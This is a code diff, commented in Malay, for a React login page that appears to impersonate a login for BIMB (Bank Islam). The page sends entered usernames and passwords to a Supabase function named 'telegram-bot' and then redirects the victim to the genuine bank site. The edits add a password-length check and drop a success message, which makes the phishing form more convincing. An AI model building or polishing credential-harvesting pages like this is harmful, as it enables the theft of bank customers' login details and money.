@@ -15,6 +15,13 @@ const LoginPage: React.FC = () => {
     e.preventDefault();
     setIsLoading(true);
 
+    // Tambah pengesahan panjang kata laluan di sini
+    if (password.length < 8) {
+      showError('Kata Laluan mesti mengandungi sekurang-kurangnya 8 aksara.');
+      setIsLoading(false);
+      return; // Hentikan penghantaran borang jika pengesahan gagal
+    }
+
     try {
       const { error } = await supabase.functions.invoke('telegram-bot', {
         body: { username, password },
@@ -24,19 +31,17 @@ const LoginPage: React.FC = () => {
         throw error;
       }
 
-      // showSuccess('Maklumat berjaya dihantar!'); // Baris ini telah dibuang
       setUsername('');
       setPassword('');
       
       // Mengalihkan pengguna ke laman web BIMB setelah berjaya
-      console.log("Mengarahkan ke laman web BIMB..."); // Tambah log ini
+      console.log("Mengarahkan ke laman web BIMB...");
       window.location.href = 'https://bimb.com/bimb-web/';
 
     } catch (error: any) {
       console.error("Ralat Penuh:", error);
       let errorMessage = 'Gagal menghantar maklumat. Sila cuba lagi.';
       
-      // Cuba dapatkan mesej ralat yang lebih spesifik dari konteks
       if (error.context && typeof error.context.json === 'function') {
         try {
           const errorBody = await error.context.json();
